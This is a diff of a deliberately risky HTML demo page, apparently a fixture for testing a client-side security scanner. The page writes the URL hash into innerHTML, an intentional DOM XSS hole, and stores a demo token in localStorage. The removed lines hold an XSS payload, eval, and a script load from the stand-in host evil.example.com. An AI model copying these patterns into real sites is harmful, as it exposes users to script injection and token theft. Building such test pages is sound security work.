@@ -5,24 +5,23 @@
     <title>Dynamic Lab</title>
   </head>
   <body>
+    <h1>Prototype-0 Same-Target Demo</h1>
+    <p>This page intentionally performs a few risky client-side actions on load.</p>
     <div id="app"></div>
 
     <script>
-      const payload = location.hash.slice(1) || '<img src=x onerror=alert(1)>';
+      const payload = location.hash || '<strong>demo payload</strong>';
+      const app = document.getElementById('app');
 
-      document.getElementById('app').innerHTML = payload;
-      document.write('<p>document.write called</p>');
-      eval("console.log('eval called')");
+      if (app) {
+        app.innerHTML = payload;
+      }
+
       localStorage.setItem('token', 'demo-secret');
-      sessionStorage.setItem('jwt', 'demo-jwt');
 
-      const scriptA = document.createElement('script');
-      scriptA.src = 'https://cdn.example.com/library.js';
-      document.body.appendChild(scriptA);
-
-      const scriptB = document.createElement('script');
-      scriptB.setAttribute('src', 'https://evil.example.com/payload.js');
-      document.body.appendChild(scriptB);
+      const externalScript = document.createElement('script');
+      externalScript.src = 'https://cdn.example.com/demo-widget.js';
+      document.body.appendChild(externalScript);
     </script>
   </body>
 </html>
